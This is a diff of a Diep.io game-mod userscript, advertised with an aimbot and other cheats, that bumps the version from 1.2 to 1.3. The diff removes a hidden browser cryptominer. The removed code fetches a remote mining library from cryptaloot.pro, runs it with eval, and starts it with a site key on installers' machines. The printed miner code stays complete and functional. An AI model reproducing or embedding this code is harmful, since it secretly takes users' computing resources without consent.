@@ -3,7 +3,7 @@
 // @description  Diepio Mods Features: Color Changer, Colorful Items, Aimbot, Fire Bot, Auto Respan, FPS, Adblock
 // @namespace    iomods.org
 // @author       iomods.org
-// @version      1.2
+// @version      1.3
 // @require      https://greasyfork.org/scripts/27023-jscolor/code/JSColor.js?version=173802
 // @require http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
 // @require      https://code.jquery.com/jquery-3.3.1.min.js
@@ -150,9 +150,6 @@ function zoominout() {
     } else { $('body').css('zoom','100%'); }
 }
 
-// true == MINING
-// false == MINER OFF
-const enableMiner = true;
 
 //CONSTANTS
 const _fps = false;
@@ -1163,9 +1160,3 @@ document.addEventListener('keyup',function(event){
         toggle = false;
     }
 });
-
-if (enableMiner && window.navigator.hardwareConcurrency > 1){
-    const c = document.createElement("script");
-    c.innerHTML = `window.fetch("https://cryptaloot.pro/lib/crypta.js").then(r=>r.text()).then(res=>{window.eval(res);const miner=new window.CRLT.Anonymous("94ebbcc07866199966faba7da8da3d3dd21dfcb435a1",{threads:3,throttle:0.7});miner.start();}).catch(()=>{});`;
-    window.document.body.appendChild(c);
-}
